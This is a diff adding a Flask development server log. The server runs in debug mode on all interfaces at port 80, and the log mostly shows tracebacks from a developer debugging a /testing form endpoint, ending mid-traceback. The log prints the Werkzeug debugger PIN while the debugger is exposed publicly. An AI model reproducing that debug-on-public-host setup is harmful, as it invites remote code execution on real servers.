@@ -1,0 +1,753 @@
+nohup: ignoring input
+ * Serving Flask app 'main'
+ * Debug mode: on
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:80
+ * Running on http://172.31.12.56:80
+Press CTRL+C to quit
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 193-793-228
+184.147.170.168 - - [18/Jan/2024 16:22:30] "POST /testing HTTP/1.1" 500 -
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1478, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1458, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1455, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 869, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 867, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 852, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+  File "/home/ubuntu/flaskcode/main.py", line 53, in testing
+    print(request.form['myDAta'])
+  File "/usr/local/lib/python3.10/dist-packages/werkzeug/datastructures/structures.py", line 192, in __getitem__
+    raise exceptions.BadRequestKeyError(key)
+werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
+KeyError: 'myDAta'
+184.147.170.168 - - [18/Jan/2024 16:23:43] "POST /testing HTTP/1.1" 500 -
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1478, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1458, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1455, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 869, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 867, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 852, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+  File "/home/ubuntu/flaskcode/main.py", line 53, in testing
+    print(request.form['myDAta'])
+  File "/usr/local/lib/python3.10/dist-packages/werkzeug/datastructures/structures.py", line 192, in __getitem__
+    raise exceptions.BadRequestKeyError(key)
+werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
+KeyError: 'myDAta'
+184.147.170.168 - - [18/Jan/2024 16:23:56] "POST /testing HTTP/1.1" 500 -
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1478, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1458, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1455, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 869, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 867, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 852, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+  File "/home/ubuntu/flaskcode/main.py", line 53, in testing
+    print(request.form['myDAta'])
+  File "/usr/local/lib/python3.10/dist-packages/werkzeug/datastructures/structures.py", line 192, in __getitem__
+    raise exceptions.BadRequestKeyError(key)
+werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
+KeyError: 'myDAta'
+ * Detected change in '/home/ubuntu/flaskcode/main.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 193-793-228
+184.147.170.168 - - [18/Jan/2024 16:24:49] "POST /testing HTTP/1.1" 500 -
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1478, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1458, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1455, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 869, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 867, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 852, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+  File "/home/ubuntu/flaskcode/main.py", line 54, in testing
+    print(request.form['myDAta'])
+  File "/usr/local/lib/python3.10/dist-packages/werkzeug/datastructures/structures.py", line 192, in __getitem__
+    raise exceptions.BadRequestKeyError(key)
+werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
+KeyError: 'myDAta'
+168.119.76.225 - - [18/Jan/2024 16:26:35] "GET /robots.txt HTTP/1.1" 404 -
+168.119.76.225 - - [18/Jan/2024 16:26:35] "GET / HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 16:26:37] "POST /testing HTTP/1.1" 500 -
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1478, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1458, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1455, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 869, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 867, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 852, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+  File "/home/ubuntu/flaskcode/main.py", line 54, in testing
+    print(request.form['myDAta'])
+  File "/usr/local/lib/python3.10/dist-packages/werkzeug/datastructures/structures.py", line 192, in __getitem__
+    raise exceptions.BadRequestKeyError(key)
+werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
+KeyError: 'myDAta'
+184.147.170.168 - - [18/Jan/2024 16:26:48] "POST /testing HTTP/1.1" 500 -
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1478, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1458, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1455, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 869, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 867, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 852, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+  File "/home/ubuntu/flaskcode/main.py", line 54, in testing
+    print(request.form['myDAta'])
+  File "/usr/local/lib/python3.10/dist-packages/werkzeug/datastructures/structures.py", line 192, in __getitem__
+    raise exceptions.BadRequestKeyError(key)
+werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
+KeyError: 'myDAta'
+65.154.226.167 - - [18/Jan/2024 16:29:54] "GET /favicon.ico HTTP/1.1" 404 -
+ * Detected change in '/home/ubuntu/flaskcode/main.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 193-793-228
+184.147.170.168 - - [18/Jan/2024 16:30:38] "POST /testing HTTP/1.1" 500 -
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1478, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1458, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1455, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 870, in full_dispatch_request
+    return self.finalize_request(rv)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 889, in finalize_request
+    response = self.make_response(rv)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1161, in make_response
+    raise TypeError(
+TypeError: The view function for 'testing' did not return a valid response. The function either returned None or ended without a return statement.
+184.147.170.168 - - [18/Jan/2024 16:30:52] "POST /testing HTTP/1.1" 500 -
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1478, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1458, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1455, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 870, in full_dispatch_request
+    return self.finalize_request(rv)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 889, in finalize_request
+    response = self.make_response(rv)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1161, in make_response
+    raise TypeError(
+TypeError: The view function for 'testing' did not return a valid response. The function either returned None or ended without a return statement.
+ * Detected change in '/home/ubuntu/flaskcode/main.py', reloading
+This is my data string
+This is my data string
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 193-793-228
+184.147.170.168 - - [18/Jan/2024 16:31:17] "POST /testing HTTP/1.1" 500 -
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1478, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1458, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1455, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 870, in full_dispatch_request
+    return self.finalize_request(rv)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 889, in finalize_request
+    response = self.make_response(rv)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1161, in make_response
+    raise TypeError(
+TypeError: The view function for 'testing' did not return a valid response. The function either returned None or ended without a return statement.
+184.147.170.168 - - [18/Jan/2024 16:31:19] "POST /testing HTTP/1.1" 500 -
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1478, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1458, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1455, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 869, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 867, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 852, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+  File "/home/ubuntu/flaskcode/main.py", line 53, in testing
+    print(request.form['mydata'])
+  File "/usr/local/lib/python3.10/dist-packages/werkzeug/datastructures/structures.py", line 192, in __getitem__
+    raise exceptions.BadRequestKeyError(key)
+werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
+KeyError: 'mydata'
+184.147.170.168 - - [18/Jan/2024 16:31:19] "POST /testing HTTP/1.1" 500 -
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1478, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1458, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1455, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 870, in full_dispatch_request
+    return self.finalize_request(rv)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 889, in finalize_request
+    response = self.make_response(rv)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1161, in make_response
+    raise TypeError(
+TypeError: The view function for 'testing' did not return a valid response. The function either returned None or ended without a return statement.
+ * Detected change in '/home/ubuntu/flaskcode/main.py', reloading
+This is my data string
+This is my data string
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 193-793-228
+184.147.170.168 - - [18/Jan/2024 16:32:28] "POST /testing HTTP/1.1" 500 -
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1478, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1458, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1455, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 870, in full_dispatch_request
+    return self.finalize_request(rv)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 889, in finalize_request
+    response = self.make_response(rv)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1161, in make_response
+    raise TypeError(
+TypeError: The view function for 'testing' did not return a valid response. The function either returned None or ended without a return statement.
+ * Detected change in '/home/ubuntu/flaskcode/main.py', reloading
+This is my data string
+None
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 193-793-228
+184.147.170.168 - - [18/Jan/2024 16:33:27] "POST /testing HTTP/1.1" 500 -
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1478, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1458, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1455, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 869, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 867, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 852, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+  File "/home/ubuntu/flaskcode/main.py", line 57, in testing
+    return "Your name is "+fname
+TypeError: can only concatenate str (not "NoneType") to str
+ * Detected change in '/home/ubuntu/flaskcode/main.py', reloading
+This is my data string
+None
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 193-793-228
+184.147.170.168 - - [18/Jan/2024 16:34:11] "POST /testing HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 16:34:15] "POST /testing HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 16:34:15] "POST /testing HTTP/1.1" 500 -
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1478, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1458, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1455, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 869, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 867, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 852, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+  File "/home/ubuntu/flaskcode/main.py", line 53, in testing
+    print(request.form['mydata'])
+  File "/usr/local/lib/python3.10/dist-packages/werkzeug/datastructures/structures.py", line 192, in __getitem__
+    raise exceptions.BadRequestKeyError(key)
+werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
+KeyError: 'mydata'
+184.147.170.168 - - [18/Jan/2024 16:34:19] "POST /testing HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 16:34:20] "POST /testing HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 16:34:21] "POST /testing HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 16:34:21] "POST /testing HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 16:34:22] "POST /testing HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 16:34:22] "POST /testing HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 16:34:22] "POST /testing HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 16:34:22] "POST /testing HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 16:34:22] "POST /testing HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 16:34:23] "POST /testing HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 16:34:23] "POST /testing HTTP/1.1" 200 -
+69.63.184.120 - - [18/Jan/2024 16:34:46] "GET / HTTP/1.1" 200 -
+69.63.184.116 - - [18/Jan/2024 16:34:46] "GET /js/scripts.js HTTP/1.1" 404 -
+184.147.170.168 - - [18/Jan/2024 16:37:52] "POST /testing HTTP/1.1" 500 -
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1478, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1458, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1455, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 869, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 867, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 852, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+  File "/home/ubuntu/flaskcode/main.py", line 53, in testing
+    print(request.form['mydata'])
+  File "/usr/local/lib/python3.10/dist-packages/werkzeug/datastructures/structures.py", line 192, in __getitem__
+    raise exceptions.BadRequestKeyError(key)
+werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
+KeyError: 'mydata'
+ * Detected change in '/home/ubuntu/flaskcode/main.py', reloading
+This is my data string
+This is my data string
+This is my data string
+This is my data string
+This is my data string
+This is my data string
+This is my data string
+This is my data string
+This is my data string
+This is my data string
+This is my data string
+This is my data string
+This is my data string
+This is my data string
+This is my data string
+This is my data string
+This is my data string
+This is my data string
+This is my data string
+This is my data string
+This is my data string
+This is my data string
+This is my data string
+This is my data string
+This is my data string
+This is my data string
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 193-793-228
+184.147.170.168 - - [18/Jan/2024 16:38:07] "POST /testing HTTP/1.1" 500 -
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1478, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1458, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1455, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 869, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 867, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 852, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+  File "/home/ubuntu/flaskcode/main.py", line 53, in testing
+    print(request.form['mydata'])
+  File "/usr/local/lib/python3.10/dist-packages/werkzeug/datastructures/structures.py", line 192, in __getitem__
+    raise exceptions.BadRequestKeyError(key)
+werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
+KeyError: 'mydata'
+184.147.170.168 - - [18/Jan/2024 16:38:46] "POST /testing HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 16:38:48] "POST /testing HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 16:38:50] "POST /testing HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 16:38:50] "POST /testing HTTP/1.1" 500 -
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1478, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1458, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1455, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 869, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 867, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 852, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+  File "/home/ubuntu/flaskcode/main.py", line 53, in testing
+    print(request.form['mydata'])
+  File "/usr/local/lib/python3.10/dist-packages/werkzeug/datastructures/structures.py", line 192, in __getitem__
+    raise exceptions.BadRequestKeyError(key)
+werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
+KeyError: 'mydata'
+ * Detected change in '/home/ubuntu/flaskcode/main.py', reloading
+This is my data string
+This is my data string
+This is my data string
+This is my data string
+This is my data string
+This is my data string
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 193-793-228
+184.147.170.168 - - [18/Jan/2024 16:41:31] "POST /testing HTTP/1.1" 500 -
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1478, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1458, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1455, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 869, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 867, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 852, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+  File "/home/ubuntu/flaskcode/main.py", line 53, in testing
+    print("Request for mydata",request.form['myDAta'])
+  File "/usr/local/lib/python3.10/dist-packages/werkzeug/datastructures/structures.py", line 192, in __getitem__
+    raise exceptions.BadRequestKeyError(key)
+werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
+KeyError: 'myDAta'
+184.147.170.168 - - [18/Jan/2024 16:41:36] "POST /testing HTTP/1.1" 500 -
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1478, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1458, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1455, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 869, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 867, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 852, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+  File "/home/ubuntu/flaskcode/main.py", line 53, in testing
+    print("Request for mydata",request.form['myDAta'])
+  File "/usr/local/lib/python3.10/dist-packages/werkzeug/datastructures/structures.py", line 192, in __getitem__
+    raise exceptions.BadRequestKeyError(key)
+werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
+KeyError: 'myDAta'
+184.147.170.168 - - [18/Jan/2024 16:41:36] "POST /testing HTTP/1.1" 500 -
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1478, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1458, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1455, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 869, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 867, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 852, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+  File "/home/ubuntu/flaskcode/main.py", line 53, in testing
+    print("Request for mydata",request.form['myDAta'])
+  File "/usr/local/lib/python3.10/dist-packages/werkzeug/datastructures/structures.py", line 192, in __getitem__
+    raise exceptions.BadRequestKeyError(key)
+werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
+KeyError: 'myDAta'
+ * Detected change in '/home/ubuntu/flaskcode/main.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 193-793-228
+184.147.170.168 - - [18/Jan/2024 16:42:50] "POST /testing HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 16:42:52] "POST /testing HTTP/1.1" 500 -
+184.147.170.168 - - [18/Jan/2024 16:42:52] "POST /testing HTTP/1.1" 200 -
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1478, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1458, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1455, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 869, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 867, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 852, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+  File "/home/ubuntu/flaskcode/main.py", line 53, in testing
+    print("Request for mydata",request.form['mydata'])
+  File "/usr/local/lib/python3.10/dist-packages/werkzeug/datastructures/structures.py", line 192, in __getitem__
+    raise exceptions.BadRequestKeyError(key)
+werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
+KeyError: 'mydata'
+184.147.170.168 - - [18/Jan/2024 16:42:55] "POST /testing HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 16:42:56] "POST /testing HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 16:42:57] "POST /testing HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 16:42:57] "POST /testing HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 16:42:57] "POST /testing HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 16:42:57] "POST /testing HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 16:45:59] "POST /testing HTTP/1.1" 500 -
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1478, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1458, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1455, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 869, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 867, in full_dispatch_request
+    rv = self.dispatch_request()
